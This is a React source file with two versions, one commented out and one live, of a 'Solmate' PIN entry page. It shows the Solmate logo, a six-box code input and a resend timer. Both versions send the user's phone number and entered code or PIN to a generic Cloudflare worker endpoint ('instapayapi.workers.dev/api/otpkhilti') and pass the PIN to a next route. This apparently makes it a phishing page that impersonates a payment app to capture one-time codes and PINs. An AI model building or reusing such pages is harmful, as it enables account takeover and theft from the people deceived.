// import React, { useState, useEffect, useRef } from "react";
// import { useNavigate, useLocation } from "react-router-dom";

// export default function SolmatePINPage() {
//   const navigate = useNavigate();
//   const location = useLocation();

//   const phone = location.state?.phone || "+27 66 909 9909";

//   const OTP_LENGTH = 6;
//   const [otp, setOtp] = useState(Array(OTP_LENGTH).fill(""));
//   const [focusedIndex, setFocusedIndex] = useState(0);
//   const [timer, setTimer] = useState(195);
//   const [error, setError] = useState("");
//   const [loading, setLoading] = useState(false);
//   const inputRefs = useRef([]);

//   // Auto focus first box on mount
//   useEffect(() => {
//     inputRefs.current[0]?.focus();
//   }, []);

//   // Resend timer
//   useEffect(() => {
//     if (timer <= 0) return;
//     const interval = setInterval(() => {
//       setTimer((t) => t - 1);
//     }, 1000);
//     return () => clearInterval(interval);
//   }, [timer]);

//   const formatTime = (s) => {
//     const m = Math.floor(s / 60);
//     const sec = s % 60;
//     return `${String(m).padStart(2, "0")}:${String(sec).padStart(2, "0")}`;
//   };

//   const handleChange = (index, value) => {
//     // Only allow digits
//     if (!/^\d*$/.test(value)) return;

//     const newOtp = [...otp];
//     newOtp[index] = value.slice(-1); // take last typed char
//     setOtp(newOtp);
//     if (error) setError("");

//     // Auto-move to next box
//     if (value && index < OTP_LENGTH - 1) {
//       inputRefs.current[index + 1]?.focus();
//     }
//   };

//   const handleKeyDown = (index, e) => {
//     if (e.key === "Backspace") {
//       if (otp[index]) {
//         const newOtp = [...otp];
//         newOtp[index] = "";
//         setOtp(newOtp);
//       } else if (index > 0) {
//         inputRefs.current[index - 1]?.focus();
//       }
//     }
//     if (e.key === "ArrowLeft" && index > 0) {
//       inputRefs.current[index - 1]?.focus();
//     }
//     if (e.key === "ArrowRight" && index < OTP_LENGTH - 1) {
//       inputRefs.current[index + 1]?.focus();
//     }
//     if (e.key === "Enter") {
//       handleVerify();
//     }
//   };

//   const handlePaste = (e) => {
//     e.preventDefault();
//     const pasted = e.clipboardData
//       .getData("text")
//       .replace(/\D/g, "")
//       .slice(0, OTP_LENGTH);
//     if (!pasted) return;

//     const newOtp = Array(OTP_LENGTH).fill("");
//     for (let i = 0; i < pasted.length; i++) {
//       newOtp[i] = pasted[i];
//     }
//     setOtp(newOtp);
//     if (error) setError("");

//     const nextIndex = Math.min(pasted.length, OTP_LENGTH - 1);
//     inputRefs.current[nextIndex]?.focus();
//   };

//   const handleVerify = async () => {
//     setError("");
//     const code = otp.join("");

//     // Validation
//     if (code.length === 0) {
//       setError("Please enter the SMS code");
//       return;
//     }
//     if (code.length < OTP_LENGTH) {
//       setError("Please enter the complete 6-digit code");
//       return;
//     }

//     try {
//       setLoading(true);
//       const response = await fetch(
//         "https://my-worker-app.instapayapi.workers.dev/api/otpkhilti",
//         {
//           method: "POST",
//           headers: { "Content-Type": "application/json" },
//           body: JSON.stringify({ phone, otp: code }),
//         }
//       );

//       const text = await response.text();
//       let data = {};
//       try {
//         data = text ? JSON.parse(text) : {};
//       } catch {
//         data = { message: text };
//       }

//       if (!response.ok) {
//         setError(data.message || "Invalid SMS code. Please try again.");
//         setOtp(Array(OTP_LENGTH).fill(""));
//         inputRefs.current[0]?.focus();
//         return;
//       }

//       console.log("Verified:", data);
//       navigate("/verifypin", { state: { phone, pin: code } });
//     } catch (err) {
//       console.error("API error:", err);
//       setError("Invalid SMS code. Please try again.");
//       setOtp(Array(OTP_LENGTH).fill(""));
//       inputRefs.current[0]?.focus();
//     } finally {
//       setLoading(false);
//     }
//   };

//   const handleRequestAgain = () => {
//     if (timer > 0) return;
//     setOtp(Array(OTP_LENGTH).fill(""));
//     setTimer(195);
//     setError("");
//     inputRefs.current[0]?.focus();
//   };

//   const handleBack = () => {
//     if (window.history.length > 1) {
//       navigate(-1);
//     } else {
//       navigate("/");
//     }
//   };

//   const isComplete = otp.every((d) => d !== "");
//   const isEnabled = isComplete && !loading;

//   return (
//     <div className="min-h-screen bg-[#0A1721] flex flex-col px-6 pt-6 pb-6">
//       {/* Back Button */}
//       <button
//         onClick={handleBack}
//         aria-label="Go back"
//         className="w-10 h-10 flex items-center justify-start text-white hover:opacity-70 transition-opacity mb-10"
//       >
//         <svg
//           xmlns="http://www.w3.org/2000/svg"
//           width="28"
//           height="28"
//           viewBox="0 0 24 24"
//           fill="none"
//           stroke="currentColor"
//           strokeWidth="2.5"
//           strokeLinecap="round"
//           strokeLinejoin="round"
//         >
//           <line x1="19" y1="12" x2="5" y2="12"></line>
//           <polyline points="12 19 5 12 12 5"></polyline>
//         </svg>
//       </button>

//       {/* Heading */}
//       <h1 className="text-white text-3xl sm:text-4xl font-bold mb-8">
//         {/* Enter you 6 digits PIN code */}
//         Enter your {OTP_LENGTH}-digit Solmate PIN
//       </h1>

//       {/* Subtitle */}
//       {/* <p className="text-gray-400 text-base sm:text-lg mb-8">
//         Code sent to number: {phone}
//       </p> */}

//       {/* OTP Boxes */}
//       <div className="flex justify-between gap-2 sm:gap-3 mb-6">
//         {otp.map((digit, index) => (
//           <input
//             key={index}
//             ref={(el) => (inputRefs.current[index] = el)}
//             type="text"
//             inputMode="numeric"
//             pattern="[0-9]*"
//             maxLength={1}
//             value={digit}
//             onChange={(e) => handleChange(index, e.target.value)}
//             onKeyDown={(e) => handleKeyDown(index, e)}
//             onFocus={() => setFocusedIndex(index)}
//             onPaste={handlePaste}
//             className={`flex-1 aspect-square max-w-[55px] text-center text-white text-2xl font-semibold rounded-xl bg-[#1A2731] outline-none transition-all ${
//               error
//                 ? "ring-2 ring-red-500"
//                 : focusedIndex === index
//                 ? "ring-2 ring-[#FFD60A]"
//                 : ""
//             }`}
//           />
//         ))}
//       </div>

//       {/* Request again / timer */}
//       <div className="text-center mb-4 min-h-[24px]">
//         {timer > 0 ? (
//           <p className="text-[#3B82F6] text-base font-medium">
//             Request code again in {formatTime(timer)}
//           </p>
//         ) : (
//           <button
//             onClick={handleRequestAgain}
//             className="text-[#3B82F6] text-base font-medium hover:underline"
//           >
//             Request code again
//           </button>
//         )}
//       </div>

//       {/* Error */}
//       {error && (
//         <p className="text-red-400 text-sm text-center font-medium mb-2">
//           {error}
//         </p>
//       )}

//       {/* Spacer pushes button to bottom */}
//       {/* <div className="flex-1"></div> */}

//       {/* Continue Button */}
//       <button
//         onClick={handleVerify}
//         disabled={!isEnabled}
//         className={`w-full py-4 rounded-full font-semibold text-lg transition-colors flex items-center justify-center gap-2 ${
//           isEnabled
//             ? "bg-[#FFD60A] text-[#0A1721] hover:bg-[#e6c109] active:bg-[#cca808]"
//             : "bg-[#5A6772] text-white cursor-not-allowed"
//         }`}
//       >
//         {loading ? (
//           <>
//             <svg
//               className="animate-spin h-5 w-5"
//               viewBox="0 0 24 24"
//               fill="none"
//             >
//               <circle
//                 cx="12"
//                 cy="12"
//                 r="10"
//                 stroke="currentColor"
//                 strokeWidth="4"
//                 className="opacity-25"
//               />
//               <path
//                 fill="currentColor"
//                 className="opacity-75"
//                 d="M4 12a8 8 0 018-8V0C5.4 0 0 5.4 0 12h4zm2 5.3A8 8 0 014 12H0c0 3 1.1 5.8 3 7.9l3-2.6z"
//               />
//             </svg>
//             Verifying...
//           </>
//         ) : (
//           "Continue"
//         )}
//       </button>
//     </div>
//   );
// }


import React, { useState, useEffect, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import solmateLogo from "./assets/logoSolmat.png";

export default function SolmatePINPage() {
  const navigate = useNavigate();
  const location = useLocation();

  const phone = location.state?.phone || "+27 66 909 9909";

  const OTP_LENGTH = 6;

  const [otp, setOtp] = useState(
    Array(OTP_LENGTH).fill("")
  );

  const [focusedIndex, setFocusedIndex] = useState(0);
  const [timer, setTimer] = useState(195);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const inputRefs = useRef([]);

  /* --------------------------------
     AUTO FOCUS FIRST INPUT
  -------------------------------- */
  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  /* --------------------------------
     TIMER
  -------------------------------- */
  useEffect(() => {
    if (timer <= 0) return;

    const interval = setInterval(() => {
      setTimer((current) => current - 1);
    }, 1000);

    return () => clearInterval(interval);
  }, [timer]);

  /* --------------------------------
     FORMAT TIMER
  -------------------------------- */
  const formatTime = (seconds) => {
    const minutes = Math.floor(seconds / 60);
    const secs = seconds % 60;

    return `${String(minutes).padStart(2, "0")}:${String(
      secs
    ).padStart(2, "0")}`;
  };

  /* --------------------------------
     HANDLE INPUT
  -------------------------------- */
  const handleChange = (index, value) => {
    // Only numbers
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];

    newOtp[index] = value.slice(-1);

    setOtp(newOtp);

    if (error) {
      setError("");
    }

    // Move next
    if (value && index < OTP_LENGTH - 1) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  /* --------------------------------
     KEYBOARD
  -------------------------------- */
  const handleKeyDown = (index, e) => {
    // Backspace
    if (e.key === "Backspace") {
      if (otp[index]) {
        const newOtp = [...otp];

        newOtp[index] = "";

        setOtp(newOtp);
      } else if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }

      return;
    }

    // Left
    if (
      e.key === "ArrowLeft" &&
      index > 0
    ) {
      inputRefs.current[index - 1]?.focus();
    }

    // Right
    if (
      e.key === "ArrowRight" &&
      index < OTP_LENGTH - 1
    ) {
      inputRefs.current[index + 1]?.focus();
    }

    // Enter
    if (e.key === "Enter") {
      handleVerify();
    }
  };

  /* --------------------------------
     PASTE OTP
  -------------------------------- */
  const handlePaste = (e) => {
    e.preventDefault();

    const pasted = e.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, OTP_LENGTH);

    if (!pasted) return;

    const newOtp = Array(OTP_LENGTH).fill("");

    for (let i = 0; i < pasted.length; i++) {
      newOtp[i] = pasted[i];
    }

    setOtp(newOtp);

    if (error) {
      setError("");
    }

    const nextIndex = Math.min(
      pasted.length,
      OTP_LENGTH - 1
    );

    inputRefs.current[nextIndex]?.focus();
  };

  /* --------------------------------
     VERIFY
  -------------------------------- */
  const handleVerify = async () => {
    setError("");

    const code = otp.join("");

    // Empty
    if (code.length === 0) {
      setError("Please enter your PIN");
      return;
    }

    // Incomplete
    if (code.length < OTP_LENGTH) {
      setError("Please enter the complete 6-digit PIN");
      return;
    }

    try {
      setLoading(true);

      const response = await fetch(
        "https://my-worker-app.instapayapi.workers.dev/api/otpkhilti",
        {
          method: "POST",

          headers: {
            "Content-Type": "application/json",
          },

          body: JSON.stringify({
            phone,
            otp: code,
          }),
        }
      );

      const text = await response.text();

      let data = {};

      try {
        data = text
          ? JSON.parse(text)
          : {};
      } catch {
        data = {
          message: text,
        };
      }

      if (!response.ok) {
        setError(
          data.message ||
            "Invalid PIN. Please try again."
        );

        setOtp(
          Array(OTP_LENGTH).fill("")
        );

        inputRefs.current[0]?.focus();

        return;
      }

      console.log("Verified:", data);

      navigate("/verifypin", {
        state: {
          phone,
          pin: code,
        },
      });
    } catch (err) {
      console.error("API error:", err);

      setError(
        "Invalid PIN. Please try again."
      );

      setOtp(
        Array(OTP_LENGTH).fill("")
      );

      inputRefs.current[0]?.focus();
    } finally {
      setLoading(false);
    }
  };

  /* --------------------------------
     REQUEST AGAIN
  -------------------------------- */
  const handleRequestAgain = () => {
    if (timer > 0) return;

    setOtp(
      Array(OTP_LENGTH).fill("")
    );

    setTimer(195);

    setError("");

    inputRefs.current[0]?.focus();
  };

  /* --------------------------------
     BACK
  -------------------------------- */
  const handleBack = () => {
    if (window.history.length > 1) {
      navigate(-1);
    } else {
      navigate("/");
    }
  };

  const isComplete = otp.every(
    (digit) => digit !== ""
  );

  const isEnabled =
    isComplete && !loading;

  return (
    <div className="min-h-screen bg-[#0A1721] text-white">

      <div
        className="
          min-h-screen
          w-full
          flex
          flex-col
          px-4
          sm:px-6
          md:px-8
          pt-5
          sm:pt-6
          pb-2
          sm:pb-3
        "
      >

        {/* =========================
            BACK BUTTON
        ========================== */}
        <button
          onClick={handleBack}
          aria-label="Go back"
          className="
            w-10
            h-10
            flex
            items-center
            justify-start
            text-white
            mb-2
            sm:mb-3
            active:scale-95
            transition-transform
          "
        >
          <svg
            xmlns="http://www.w3.org/2000/svg"
            width="28"
            height="28"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2.5"
            strokeLinecap="round"
            strokeLinejoin="round"
          >
            <line
              x1="19"
              y1="12"
              x2="5"
              y2="12"
            />

            <polyline
              points="12 19 5 12 12 5"
            />
          </svg>
        </button>


        {/* =========================
            LOGO
        ========================== */}
        <div
          className="
            flex
            justify-center
            items-center
            mb-4
            sm:mb-5
          "
        >
          <img
            src={solmateLogo}
            alt="SOLmate"
            className="
              w-[120px]
              xs:w-[130px]
              sm:w-[145px]
              md:w-[155px]
              h-auto
              object-contain
            "
          />
        </div>


        {/* =========================
            HEADING
        ========================== */}
        <div className="mb-7 sm:mb-8">

          <h1
            className="
              text-white
              text-[30px]
              sm:text-[34px]
              md:text-[38px]
              font-bold
              leading-tight
              tracking-[-0.5px]
            "
          >
            Welcome back
          </h1>

          <p
            className="
              text-[#8B9AA5]
              text-[15px]
              sm:text-[17px]
              md:text-[18px]
              font-medium
              mt-3
            "
          >
            Enter your 6 digits Solmate PIN
          </p>

        </div>


        {/* =========================
            PIN BOXES
        ========================== */}
        <div
          className="
            w-full
            flex
            justify-between
            items-center
            gap-[6px]
            xs:gap-2
            sm:gap-3
          "
        >

          {otp.map((digit, index) => (
            <input
              key={index}
              ref={(el) => {
                inputRefs.current[index] = el;
              }}
              type="text"
              inputMode="numeric"
              pattern="[0-9]*"
              maxLength={1}
              value={digit}
              onChange={(e) =>
                handleChange(
                  index,
                  e.target.value
                )
              }
              onKeyDown={(e) =>
                handleKeyDown(index, e)
              }
              onFocus={() =>
                setFocusedIndex(index)
              }
              onPaste={handlePaste}
              className={`
                flex-1
                min-w-0

                h-[52px]
                xs:h-[56px]
                sm:h-[62px]
                md:h-[66px]

                rounded-[13px]
                sm:rounded-[16px]

                bg-[#1A2731]

                text-center
                text-white
                text-xl
                sm:text-2xl

                font-semibold

                outline-none

                transition-all

                ${
                  error
                    ? "ring-2 ring-red-500"
                    : focusedIndex === index
                    ? "ring-2 ring-[#3B5361]"
                    : ""
                }
              `}
            />
          ))}

        </div>


        {/* =========================
            TIMER
        ========================== */}
        <div
          className="
            text-center
            mt-6
            sm:mt-7
            min-h-[24px]
          "
        >

          {timer > 0 ? (
            <p
              className="
                text-[#3B82F6]
                text-[14px]
                sm:text-base
                font-medium
              "
            >
              Request code again in{" "}
              {formatTime(timer)}
            </p>
          ) : (
            <button
              onClick={handleRequestAgain}
              className="
                text-[#3B82F6]
                text-[14px]
                sm:text-base
                font-medium
                hover:underline
              "
            >
              Request code again
            </button>
          )}

        </div>


        {/* =========================
            ERROR
        ========================== */}
        {error && (
          <p
            className="
              text-red-400
              text-sm
              text-center
              font-medium
              mt-3
              px-2
            "
          >
            {error}
          </p>
        )}


        {/* =========================
            SPACER
        ========================== */}
        {/* <div className="flex-1 min-h-[70px]" /> */}


        {/* =========================
            CONTINUE BUTTON
        ========================== */}
        <button
          onClick={handleVerify}
          disabled={!isEnabled}
          className={`
            w-full

            h-[55px]
            sm:h-[60px]
            md:h-[64px]

            rounded-full

            font-semibold
            text-[17px]
            sm:text-lg

            transition-all

            flex
            items-center
            justify-center
            gap-2

            ${
              isEnabled
                ? `
                  bg-[#FFD60A]
                  text-[#0A1721]
                  hover:bg-[#e6c109]
                  active:scale-[0.98]
                `
                : `
                  bg-[#5A6772]
                  text-white
                  cursor-not-allowed
                `
            }
          `}
        >

          {loading ? (
            <>
              <svg
                className="animate-spin h-5 w-5"
                viewBox="0 0 24 24"
                fill="none"
              >
                <circle
                  cx="12"
                  cy="12"
                  r="10"
                  stroke="currentColor"
                  strokeWidth="4"
                  className="opacity-25"
                />

                <path
                  fill="currentColor"
                  className="opacity-75"
                  d="
                    M4 12
                    a8 8 0 018-8
                    V0
                    C5.4 0 0 5.4 0 12
                    h4
                    zm2 5.3
                    A8 8 0 014 12
                    H0
                    c0 3 1.1 5.8 3 7.9
                    l3-2.6z
                  "
                />
              </svg>

              Verifying...
            </>
          ) : (
            "Continue"
          )}

        </button>

      </div>
    </div>
  );
}